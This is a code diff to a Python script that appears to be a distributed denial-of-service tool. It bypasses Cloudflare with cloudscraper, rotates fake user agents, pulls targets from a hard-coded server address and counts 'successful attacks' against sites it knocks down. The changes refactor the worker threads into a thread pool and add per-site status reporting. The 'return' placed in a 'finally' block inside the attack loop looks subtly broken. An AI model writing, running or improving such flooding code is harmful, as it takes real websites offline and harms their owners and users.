@@ -1,21 +1,22 @@
-import cloudscraper
+import json
 import os
-from urllib.parse import unquote
+import platform
+import sys
+from argparse import ArgumentParser
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
-from loguru import logger
 from os import system
+from random import choice
 from sys import stderr
 from threading import Thread
-from random import choice
 from time import sleep
-from urllib3 import disable_warnings
-from pyuseragents import random as random_useragent
-from argparse import ArgumentParser
-import platform
-from requests.exceptions import ConnectionError
+from urllib.parse import unquote
 
-import json
-import sys
+import cloudscraper
+from loguru import logger
+from pyuseragents import random as random_useragent
+from requests.exceptions import ConnectionError
+from urllib3 import disable_warnings
 
 VERSION = 7
 HOSTS = ["http://65.108.20.65"]
@@ -88,6 +89,7 @@ def checkUpdate():
 
 
 def mainth():
+    result = 'processing'
     scraper = cloudscraper.create_scraper(
         browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
     scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
@@ -156,10 +158,16 @@ def mainth():
             if attacks_number > 0:
               logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
         except ConnectionError as exc:
-            logger.info(f"Site is down: {exc}")
+            result = "site is down"
+            logger.info(f"SITE IS DOWN")
+            if verbose:
+                logger.info(f"Site is down: {exc}")
         except Exception as exc:
+            result = f"issue happened: {exc}"
             logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
             continue
+        finally:
+            return result, site
 
 
 def cleaner():
@@ -177,6 +185,10 @@ if __name__ == '__main__':
       clear()
     checkReq()
     checkUpdate()
-    for _ in range(threads):
-        Thread(target=mainth).start()
     Thread(target=cleaner, daemon=True).start()
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        future_tasks = [executor.submit(mainth) for _ in range(threads)]
+        for task in as_completed(future_tasks):
+            status, site = task.result()
+            logger.info(f"{status.upper()}: {site}")
